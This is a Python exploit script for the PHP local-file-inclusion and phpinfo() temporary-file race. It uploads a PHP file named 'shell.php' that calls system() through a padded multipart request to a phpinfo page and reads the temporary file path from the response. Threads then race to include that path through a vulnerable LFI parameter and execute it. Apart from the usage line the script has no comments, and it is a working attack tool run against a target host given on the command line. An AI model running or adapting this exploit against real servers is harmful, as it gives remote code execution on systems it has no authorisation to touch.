import socket
import sys
import threading
from queue import Queue
import re





if(len(sys.argv) < 4):
    print(f'Usage: {sys.argv[0]} 192.168.1.1 /info.php /lfi.php?load='.format())
    exit()

payloads = Queue()
target_host = sys.argv[1]
target_port = 80
phpinfo_path = sys.argv[2]
lfi_path = sys.argv[3]


def the_exploit():
    global target_host
    global lfi_path
    path = payloads.get()
    request = f'GET {lfi_path}{path} HTTP/1.1\r\nHost: {target_host}\r\nProxy-Connection: Keep-Alive\r\n\r\n'.format()
    print(path)
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_host,target_port))
    client.sendall( bytes(request, 'utf-8') )




def father():
    while True:
        the_exploit()
        payloads.task_done()

def mother():
    while True:
        upload_request()

def upload_request():
    global target_host
    pattern = re.compile('(tmp_name\]\s+\S+\s+)(.*)')
    padding = "A" * 5000

    file_upload_content = """-----------------------------329859672114714374022258702947\r\nContent-Disposition: form-data; name="payload"; filename="shell.php"\r\nContent-Type: application/octet-stream\r\n\r\n<?php system('calc.exe') ?>\r\n-----------------------------329859672114714374022258702947--\r\n"""

    file_upload_content_length = len(file_upload_content)

    file_upload_req = f'POST {phpinfo_path}?a={padding} HTTP/1.1\r\nHost: {target_host}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie={padding}\r\nHTTP_ACCEPT: {padding}\r\nHTTP_USER_AGENT: {padding}\r\nHTTP_ACCEPT_LANGUAGE: {padding}\r\nHTTP_PRAGMA: {padding}\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: multipart/form-data; boundary=---------------------------329859672114714374022258702947\r\nContent-Length: {file_upload_content_length}\r\n\r\n'.format()


    file_upload_req = file_upload_req + file_upload_content

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_host, target_port))
    client.sendall(bytes(file_upload_req, 'utf-8'))

    while True:
        try:
            response = client.recv(2048).decode('utf-8')
            if ('tmp_name' in response):
                needle = pattern.findall(response)[0][1]
                payloads.put(needle)
                print(needle)
                break
        except:
            break
    return


for i in range(10):
    t = threading.Thread(target=father)
    t.setDaemon(True)
    t.start()


for i in range(10):
    mother()


